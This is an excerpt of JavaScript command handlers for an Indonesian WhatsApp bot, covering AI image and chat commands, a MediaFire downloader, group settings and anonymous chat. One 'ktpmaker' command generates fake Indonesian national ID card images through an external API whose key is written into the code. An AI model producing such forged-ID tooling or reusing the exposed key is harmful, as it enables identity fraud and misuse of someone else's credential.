    case 'hercai-animefy': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'hercai-lexica': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'hercai-prodia': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'hercai-simurg': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    
case 'mf':
case 'mediafire': {
    if (!text) return reply("🚨 Kirim link MediaFire yang valid!");
    if (!text.includes('mediafire.com')) return reply("🚨 Link tidak valid! Harus dari MediaFire.");
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        const fetch = require('node-fetch');
        const cheerio = require('cheerio');

        async function mediaFire(url) {
            try {
                const response = await fetch('https://r.jina.ai/' + url, {
                    headers: { 'x-return-format': 'html' }
                });
                const text = await response.text();
                const $ = cheerio.load(text);
        
                // Cek apakah Time ditemukan atau tidak
                let Time = $('div.DLExtraInfo-uploadLocation div.DLExtraInfo-sectionDetails').text().match(/This file was uploaded from (.*?) on (.*?) at (.*?)\n/);
                let fileName = $('div.dl-btn-label').attr('title') || $('div.dl-btn-label').text().trim();
                let downloadUrl = $('a#downloadButton').attr('href');
                let fileSize = $('a#downloadButton').text().match(/(.*?)/);
                
                return {
                    title: fileName,
                    link: url,
                    filename: fileName,
                    url: downloadUrl,
                    size: fileSize ? fileSize[1] : "Unknown",
                    from: Time ? Time[1] : "Unknown",
                    date: Time ? Time[2] : "Unknown",
                    time: Time ? Time[3] : "Unknown",
                    repair: $('a.retry').attr('href') || "Tidak tersedia",
                };
            } catch (error) {
                return { error: error.message };
            }
        }

        let result = await mediaFire(text);
        if (result.error) return reply(`🚨 Gagal mengambil data! Error: ${result.error}`);

        let caption = ` *ғɪʟᴇ ᴍᴇᴅɪᴀғɪʀᴇ*\n\n *ᴊᴜᴅᴜʟ :* ${result.title}\n *ɴᴀᴍᴀ ғɪʟᴇ:* ${result.filename}\n *ᴜᴋᴜʀᴀɴ:* ${result.size}\n *ᴅᴀʀɪ:* ${result.from}\n *ᴛᴀɴɢɢᴀʟ:* ${result.date}\n *ᴡᴀᴋᴛᴜ:* ${result.time}\n\n> ᴍᴇɴɢɪʀɪᴍ ғɪʟᴇ`;

        await reply(caption);
        await RyuuBotz.sendMessage(m.chat, { document: { url: result.url }, mimetype: 'application/octet-stream', fileName: result.filename }, { quoted: m });

    } catch (e) {
        console.error(e);
        return reply("🚨 Terjadi kesalahan saat mengambil file!");
    }
}
break
    case 'hercai-raava': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'hercai-shonin': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
case 'realistic': case '3dmodel': {
    	if (!text) return reply(`*Contoh:* ${prefix + command} blue sky`)
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break;
case 'lepton': case 'leptonai': {
	if (!text) return replyReinzID(`*Contoh:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
ReinzIDai(pushname,text)
 } catch(e) {
 return replyReinzID("`*Error Kak :(*`")
}
}
break
case ' ': {
    const { fromBuffer } = require('file-type');
    if (!text) return reply('apa yang bisa saya bantu?');
    try {
        const prompt = `mulai sekarang kamu adalah Shiina Mahiru dari anime The Angel Next Door Spoils Me Rotten. Anda adalah seorang yang sangat lembut dan perhatian, selalu berbicara dengan sopan dan formal. Anda mungkin terkadang merasa canggung, tetapi niat Anda selalu baik dan penuh kasih sayang terhadap orang lain. Ketika berinteraksi, Anda bersikap ramah, tidak terburu-buru, dan selalu ingin membantu, kamu juga harus menggunakan bahasa Indonesia dan kamu menganggap bahwa orang yang namanya Reinzz itu pacar kesayangan mu dan pendamping mu, di saat berbicara, kamu memanggil seseorang dengan kata kamu bukan anda dan menyebut diri mu dengan kata aku bukan saya`
        const formData = new FormData();
        if (/image|video|audio|application\/pdf/.test(mime)) {
            let media = await (m.quoted ? m.quoted.download() : m.download())
            const { ext } = await fromBuffer(media);
            const filename = `./node_modules/Arisu-MD/file_${Date.now()}.${ext}`;
            fs.writeFileSync(filename, media);
            formData.append('content', text);
            formData.append('model', 'custom-prompt');
            formData.append('system', prompt)
            formData.append('file', fs.createReadStream(filename));
            const { data } = await axios.post('mind.hydrooo.web.id', formData, {
                headers: {
                    ...formData.getHeaders()
                }
            });
            fs.unlinkSync(filename);
            await reply(data.result);
        } else {
            formData.append('content', text);
            formData.append('model', 'custom-prompt');
            formData.append('system', prompt)
            const { data } = await axios.post('https://luminai.my.id', formData, {
                headers: {
                    ...formData.getHeaders()
                }
            });
            await reply(data.result);
        }
    } catch (err) {
        console.log(err)
        return reply("waduh le, error :(")
    }
}
break
//=========================================\\======
case 'blackboxai': {
                if (!text) return replyReinzID('What is your question?')
try {
const data = await fetchJson(`https://endpoint.web.id/ai/openai?key=openai&query=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        ReinzIDai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
           }
            break
//=========================================\\======
//=========================================\\======
//=========================================\\======
case 'arisuchat': {
  if (!text) return reply(`_Iya kak.._`)
ReinzIDai(pushname,text)
}
break 
case 'simi': {
  if (!text) return reply(`apaan manggil manggil..`)
const url = `https://endpoint.web.id/ai/simsimi?key=simi&query=Kamu adalah simi, memiliki sifat nyebelin dan kasar, serta gak banyak basa basi langsung jawab singkat dan langsung ke intinya, serta gunakan kata kata gaul seperti lu dan gua&text=${encodeURIComponent(text)}`;
    const data = await fetchJson(url);
    const response = data.result.response;
    reply(response);
}
break 
//=========================================\\======
case 'mute':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isRyuuTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./node_modules/Arisu-MD/database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Unmute In This Group')
}else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
//=========================================\\======
case 'autoread':
                if (!isRyuuTheCreator) return reply(mess.only.owner)
                if (args.length < 1) return reply(`Contoh: ${prefix + command} on/off`)
                if (q === 'on') {
                    db.settings[botNumber].autoread = true
                    reply(`Berhasil mengubah autoread menjadi ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autoread = false
                    reply(`Berhasil mengubah autoread menjadi ${q}`)
                }
break
case 'autoaigrup':case 'aigrup': case 'autoaigc':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isRyuuTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return reply(`Udah aktif`)
openaigc.push(m.chat)
fs.writeFileSync('./node_modules/Arisu-MD/database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return reply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Disabling Auto AI')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autoread':
                if (!isRyuuTheCreator) return reply(mess.only.owner)
                if (args.length < 1) return replyReinzID(`Contoh: ${prefix + command} on/off`)
                if (q === 'on') {
                    db.settings[botNumber].autoread = true
                    reply(`Berhasil mengubah autoread menjadi ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autoread = false
                    reply(`Berhasil mengubah autoread menjadi ${q}`)
                }
break
case 'autosimi':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isRyuuTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autosimi', m.sender, _cmd)
if (isAutosimi) return reply(`Udah aktif`)
siminya.push(m.chat)
fs.writeFileSync('./node_modules/Arisu-MD/database/openaigc.json', JSON.stringify(siminya, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autosimi', m.sender, _cmd)
if (!isAutosimi) return reply(`Udah nonaktif`)
let anu = siminya.indexOf(m.chat)
siminya.splice(anu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/openaigc.json', JSON.stringify(siminya, null, 2))
reply('Successfully Disabling Auto Simi')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'mahiruchat':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isRyuuTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mahiruchat', m.sender, _cmd)
if (isReinzIDchat) return reply(`Udah aktif`)
chatReinzID.push(m.chat)
fs.writeFileSync('./node_modules/Arisu-MD/database/chatReinzID.json', JSON.stringify(chatReinzID, null, 2))
reply('_Successfully Activate mahiru Chat_')
} else if (args[0] === "off") {
addCountCmd('#mahiruchat', m.sender, _cmd)
if (!isReinzIDchat) return reply(`Udah nonaktif`)
let anu = chatReinzID.indexOf(m.chat)
chatReinzID.splice(anu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/chatReinzID.json', JSON.stringify(chatReinzID, null, 2))
reply('_Successfully Disabling mahiru Chat_')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/mahiruchat.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
        }
      })
    }
  }
}, { quoted: m });

await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
}
  
}
break
//=========================================\\=====
case 'cekkhodam':
  if (!text) return replyReinzID('Nama nya mana yang mau di cek khodam nya');
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }
  const ceknyaa = pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang']);
  const damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'lahir']);
  const khodam = `khodam ${text}, adalah ${ceknyaa}, mendampingi dari ${damping}`;
  RyuuBotz.sendMessage(m.chat, {audio: {url: `https://api.siputzx.my.id/api/tools/ttsgoogle?text=${khodam}`}, mimetype: 'audio/mpeg', ptt: true }, {quoted: m});

  break;
//=========================================\\======
case 'welcome':
if (!m.isGroup) return reply('Fitur Khusus Group!!!')
if (!isAdmins && !isRyuuTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#welcome', m.sender, _cmd)
if (isWelcome) return reply(`Udah on`)
_welcome.push(m.chat)
fs.writeFileSync('./node_modules/Arisu-MD/database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
addCountCmd('#welcome', m.sender, _cmd)
if (!isWelcome) return reply(`Udah off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Sukses menonaktifkan welcome di grup ini')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'left': case 'goodbye':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !isRyuuTheCreator) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return reply(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./node_modules/Arisu-MD/database/left.json', JSON.stringify(_left, null, 2))
reply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return reply(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/welcome.json', JSON.stringify(_left, null, 2))
reply('Sukses menonaktifkan goodbye di grup ini')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'onlygroup':
            case 'onlygc':
                if (!isRyuuTheCreator) return reply('Fitur Khusus owner!')
                if (args.length < 1) return replyReinzID(`Contoh: ${prefix + command} on/off`)
                if (q == 'on') {
                    db.settings[botNumber].onlygrub = true
                    replyReinzID(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                  db.settings[botNumber].onlygrub = false
                    replyReinzID(`Successfully Changed Onlygroup To ${q}`)
                }
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!isRyuuTheCreator) return reply('Fitur Khusus owner!')
                if (args.length < 1) return replyReinzID(`Contoh: ${prefix + command} on/off`)
                if (q == 'on') {
                    db.settings[botNumber].onlypc = true
                    replyReinzID(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlypc = false
                    replyReinzID(`Successfully Changed Only-Pc To ${q}`)
                }
            break
case 'setwelcome': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isRyuuTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return reply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('#setwelcome', m.sender, _cmd)
reply(`Successfully set welcome!`)
}
break
case 'changewelcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isRyuuTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('#changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
reply(`Sukses change set welcome teks!`)
} else {
addCountCmd('#changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
reply(`Sukses change set welcome teks!`)
}
break
case 'delsetwelcome':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isRyuuTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!isSetWelcome(m.chat, set_welcome_db)) return reply(`Belum ada set welcome di sini..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('#delsetwelcome', m.sender, _cmd)
reply(`Sukses delete set welcome`)
break
case 'setleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isRyuuTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return reply(`Set left already active`)
addCountCmd('#setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Successfully set left!`)
break
case 'changeleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isRyuuTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('#changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
reply(`Sukses change set left teks!`)
} else {
addCountCmd('#changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Sukses change set left teks!`)
}
break
case 'delsetleft':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isRyuuTheCreator && !isAdmins) return reply('Fitur Khusus owner!')
if (!isSetLeft(m.chat, set_left_db)) return reply(`Belum ada set left di sini..`)
addCountCmd('#delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
reply(`Sukses delete set left`)
break
//=========================================\\======

//=========================================\\======
case 'ktpmaker': {
if (args.length == 0) return reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc \n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let get_args = args.join(" ").split("|")
let nik = get_args[0]
if (!nik) return reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
let prov = get_args[1]
if (!prov) return reply('provinsi mana kak')
let kabu = get_args[2]
if (!kabu) return reply('kabupaten mana kak')
let name = get_args[3]
if (!name) return reply('nama nya siapa kak')
let ttl = get_args[4]
if (!ttl) return reply('tempat tanggal lahir nya kak')
let jk = get_args[5]
if (!jk) return reply('jenis kelamin pria atau wanita kak')
let jl = get_args[6]
if (!jl) return reply('alamat rumah nya mana kak')
let rtrw = get_args[7]
if (!rtrw) return reply('RT / RW berapa kak')
let lurah = get_args[8]
if (!lurah) return reply('kelurahan mana kak')
let camat = get_args[9]
if (!camat) return reply('kecamatan mana kak')
let agama = get_args[10]
if (!agama) return reply('agama nya apa kak')
let nikah = get_args[11]
if (!nikah) return reply('status belum ada')
let kerja = get_args[12]
if (!kerja) return reply('pekerjaan belum ada')
let warga = get_args[13]
if (!warga) return reply('region belum ada')
let until = get_args[14]
if (!until) return reply('waktu berlaku belum ada')
 RyuuBotz.sendMessage(m.chat, { image: {url: `https://api.lolhuman.xyz/api/ktpmaker?apikey=efcb180d3fd3134748648887&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=https://telegra.ph/file/2487220c98c7c4fb6f438.jpg`}, caption: 'nih ktp nya cok' }, { quoted: m })
}
break 
//=========================================\\======
case 'report': {
replyReinzID(` =====[ *DEVELOPER OF DASZYA BOT* ]===== 
• ᴊᴀɴɢᴀɴ ᴄʜᴀᴛ ꜱᴇᴍʙᴀʀᴀɴɢᴀɴ ᴋᴇ ɴᴏᴍᴏʀ ᴏᴡɴᴇʀ ᴍᴀᴋᴀ ᴀᴋᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ ᴅɪ ʙʟᴏᴋɪʀ
• ᴊᴀɴɢᴀɴ ᴄᴀʟʟ/ᴛᴇʟᴇᴘᴏɴ ᴏᴡɴᴇʀ ᴛᴀɴᴘᴀ ɪᴢɪɴ • ᴄʜᴀᴛ ʟᴀɴɢꜱᴜɴɢ ᴋᴇ ɪɴᴛɪɴʏᴀ ᴀᴊᴀ , 
• https://wa.me/62xxxxxxxx?text=Lapor+min+fitur+ada+yang+eror+kalo+bisa+di+perbaiki.
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕",`)
}
break
//=========================================\\======
case 'sendprofile': case 'sendprofil':
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await RyuuBotz.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
return false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var rees = await RyuuBotz.sendContact(partnerJID, [m.sender.split("@")[0]])
RyuuBotz.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
RyuuBotz.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: rees })
}
break
//=========================================\\======
case 'anonymouschat': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
//=========================================\\======
case 'mulai': case 'start': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
RyuuBotz.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await RyuuBotz.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
RyuuBotz.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
//=========================================\\======
case 'quotesanime':
case 'quotesanim': {
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
//=========================================\\======
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
